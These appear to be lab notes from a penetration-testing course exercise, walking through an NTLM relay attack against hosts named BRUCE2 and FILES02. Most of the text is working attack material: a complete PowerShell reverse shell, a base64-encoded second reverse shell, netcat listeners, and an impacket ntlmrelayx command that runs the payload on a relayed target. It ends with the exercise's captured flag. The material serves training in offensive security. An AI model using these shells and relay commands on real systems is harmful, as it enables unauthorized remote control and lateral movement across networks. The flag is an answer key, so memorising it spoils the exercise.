$LHOST = "192.168.45.206"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

# Reverse shell port 5555 to connect to FILES02 via hash relay
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```bash
# Tab 1 start nc listener for webserver BRUCE2
nc -nlvp 4444

# Tab 2 start nc listener for FILES02
nc -nlvp 5555

# Tab 3 start relay attack w/ 2nd PS revshell
impacket_ntlmrelayx --no-http-server -smb2support -t 192.168.178.212 -c "powershell -e JABjAGwAaQBlAG4........=="
```

- Submit 1st reverse shell PS to webapp
![](15.3.3.2ex_powershellupload.png)

```powershell
# Tab 1 - connection to BRUCE2
# Navigate to faux share
dir \\192.168.45.206\test

# Tab 2 - connection to FILES02
type C:\Users\anastasia\Desktop\flag.txt
```

> Answer:  OS{697dc6f0aa5415ad4729da69f3e54fb4}